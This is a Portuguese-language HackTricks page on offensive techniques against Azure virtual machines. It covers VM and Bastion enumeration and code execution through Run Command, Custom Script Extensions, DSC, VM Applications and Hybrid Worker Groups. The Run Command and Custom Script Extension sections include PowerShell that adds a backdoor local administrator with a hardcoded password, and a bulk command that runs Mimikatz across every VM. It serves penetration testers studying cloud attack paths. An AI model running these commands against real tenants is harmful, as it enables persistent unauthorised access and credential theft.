# Az - M√°quinas Virtuais & Rede

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informa√ß√µes B√°sicas

As m√°quinas virtuais Azure s√£o um dos v√°rios tipos de [recursos de computa√ß√£o escal√°veis e sob demanda](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) que o Azure oferece. Normalmente, voc√™ escolhe uma m√°quina virtual quando precisa de mais controle sobre o ambiente de computa√ß√£o do que as outras op√ß√µes oferecem. Este artigo fornece informa√ß√µes sobre o que voc√™ deve considerar antes de criar uma m√°quina virtual, como cri√°-la e como gerenci√°-la.

## Informa√ß√µes da Rede Azure

As redes Azure cont√™m **diferentes entidades e maneiras de configur√°-las.** Voc√™ pode encontrar **descri√ß√µes,** **exemplos** e comandos de **enumera√ß√£o** das diferentes entidades de rede Azure em:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** √© um servi√ßo totalmente gerenciado que fornece **acesso RDP** (Protocolo de √Årea de Trabalho Remota) e **SSH** (Secure Shell) **seguro e cont√≠nuo** √†s suas **m√°quinas virtuais diretamente no portal Azure sobre SSL**. Este servi√ßo √© uma alternativa mais segura e conveniente **√† exposi√ß√£o de suas m√°quinas virtuais a conex√µes p√∫blicas de Internet**. O Azure Bastion √© provisionado dentro da sua Rede Virtual Azure, fornecendo conectividade RDP e SSH para todas as VMs na VNet usando endere√ßos IP privados, o que significa que voc√™ n√£o precisa atribuir endere√ßos IP p√∫blicos √†s suas VMs Azure.

Ent√£o, se sua empresa tem v√°rias VMs hospedadas dentro de uma VNet Azure para desenvolvimento e teste. **Em vez de configurar endere√ßos IP p√∫blicos e gerenciar regras NSG** para cada VM para habilitar o acesso RDP ou SSH, voc√™ **implanta o Azure Bastion**. Com o Azure Bastion, seus desenvolvedores e pessoal de TI podem **acessar essas VMs a partir do portal Azure usando seus navegadores web de forma segura** sem a necessidade de endere√ßos IP p√∫blicos.

Para listar todos os Hosts Azure Bastion na sua assinatura, voc√™ pode usar o seguinte comando:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
## Enumera√ß√£o de VM
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Executar comandos em uma VM**

### **Login AAD em VM**

√â poss√≠vel permitir acesso a usu√°rios autenticados via AzureAD. Por exemplo, ao tentar acessar uma **VM linux**: `ssh username@azure-corp.com@1.1.1.1` (√© importante **usar o email** com o azurecorp usado ao tentar fazer login), voc√™ pode receber um erro como:

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Apenas **siga essas instru√ß√µes** acessando [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) e indicando o c√≥digo, use o email e a senha como credenciais e voc√™ poder√° se conectar via SSH (se esse usu√°rio tiver permiss√µes suficientes para fazer isso: `Virtual Machine Administrator Login` ou `Virtual Machine User Login` role).

### **Run Command**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Executar Extens√£o de Script Personalizado**

As extens√µes de m√°quina virtual (VM) do Azure s√£o **pequenas aplica√ß√µes** que fornecem configura√ß√£o p√≥s-implanta√ß√£o e **tarefas** de automa√ß√£o em **VMs do Azure**. Por exemplo, se uma m√°quina virtual necessita de instala√ß√£o de software, prote√ß√£o antiv√≠rus ou a capacidade de executar um script dentro dela, voc√™ pode usar uma extens√£o de VM.

Portanto, se voc√™ tem acesso para escrever nela, voc√™ pode executar c√≥digo arbitr√°rio:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState

**DesiredConfigurationState (DSC)** √© semelhante ao Ansible, mas √© uma ferramenta dentro do PowerShell que permite configurar um host por meio de c√≥digo. O DSC tem sua pr√≥pria extens√£o no Azure que permite o upload de **arquivos de configura√ß√£o**. Os [arquivos de configura√ß√£o](https://docs.microsoft.com/en-us/powershell/dsc/getting-started/wingettingstarted?view=dsc-1.1#define-a-configuration-and-generate-the-configuration-document) do DSC s√£o bastante exigentes quanto √† sintaxe, no entanto, a extens√£o do DSC √© muito cr√©dula e executar√° **cegamente qualquer comando** desde que siga um determinado formato, conforme mostrado na figura 5.

<figure><img src="../../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

Isso pode ser feito atrav√©s da fun√ß√£o **Az PowerShell** [**`Publish-AzvmdscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0). A extens√£o DSC requer um **.PS1** com uma **fun√ß√£o** e **empacotado** em um arquivo **.zip**. Como essa n√£o √© a sintaxe correta do DSC, o status da extens√£o ser√° exibido como "falha", no entanto, o c√≥digo ser√° executado. O problema √© que n√£o h√° sa√≠da do comando, pois o status √© sobrescrito com a mensagem de falha.

### VM Application Definitions

O recurso [VM Applications](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications) √© uma maneira de **implantar aplica√ß√µes versionadas de forma repet√≠vel** em uma VM do Azure. Por exemplo, se voc√™ criar um **programa** e **implant√°-lo** em todas as VMs do Azure como vers√£o 1.0, uma vez que voc√™ **atualize** o programa **para 1.1**, voc√™ pode usar a mesma Aplica√ß√£o VM para **criar outra defini√ß√£o** e enviar a atualiza√ß√£o para qualquer VM.\
Ser capaz de **implantar uma aplica√ß√£o** em uma VM significa que √© mais um caminho para **execu√ß√£o de c√≥digo**. A desvantagem deste m√©todo √© que a configura√ß√£o da Defini√ß√£o da Aplica√ß√£o [**requer alguns passos**](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=portal), mas pode ser realizada usando os cmdlets **`New-AzGalleryApplication`** e **`New-AzGalleryApplicationVersion`** no Az PowerShell.

Esta t√©cnica funciona utilizando uma **extens√£o "VMAppExtension"** que √© automaticamente instalada ao aplicar uma aplica√ß√£o a uma VM. A extens√£o baixa o arquivo da URI para o disco com o nome da Aplica√ß√£o _exatamente_, o que significa que se o nome da aplica√ß√£o for 'AzApplication', o arquivo no disco tamb√©m ser√° chamado 'AzApplication', sem extens√£o. Isso requer que o campo "ManageActions" na [chamada da API REST](https://docs.microsoft.com/en-us/rest/api/compute/gallery-application-versions/create-or-update) seja configurado para renomear a aplica√ß√£o com a extens√£o apropriada. Se voc√™ n√£o quiser executar uma aplica√ß√£o inteira, comandos do PowerShell arbitr√°rios podem ser executados abusando tamb√©m do campo ManageActions no mesmo m√©todo da API REST ou tamb√©m atrav√©s do Portal Azure. Uma vez configurado, a defini√ß√£o ser√° semelhante √† figura 8.

<figure><img src="../../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

Esta t√©cnica de execu√ß√£o √© infelizmente lenta (cerca de 3-4 minutos para executar um aplicativo ou comando), no entanto, sendo relativamente nova, seria surpreendente se houvesse detec√ß√µes espec√≠ficas escritas.

Como √© uma extens√£o que finalmente faz a execu√ß√£o, uma c√≥pia da aplica√ß√£o est√° localizada em `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` e o status da execu√ß√£o √© mantido em `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`.

### Hybrid Worker Groups

[**Hybrid Worker Groups**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) (HWGs) permitem que um **Runbook** configurado em uma Conta de Automa√ß√£o seja **executado** em uma **M√°quina Virtual Azure** que faz parte do **HWG configurado**. Mais uma vez, uma **extens√£o √© usada** na VM para implantar o c√≥digo do Runbook na VM. Como uma extens√£o √© usada, as credenciais s√£o irrelevantes e o c√≥digo √© executado como **SYSTEM** ou root.

<figure><img src="../../../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>

Se estiver usando uma VM Windows 10, √© importante que o Runbook seja executado como PowerShell Vers√£o 5.1 em vez de 7.1, pois 7.1 n√£o est√° instalado nas VMs por padr√£o e o script falhar√° ao ser executado.

## Refer√™ncias

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
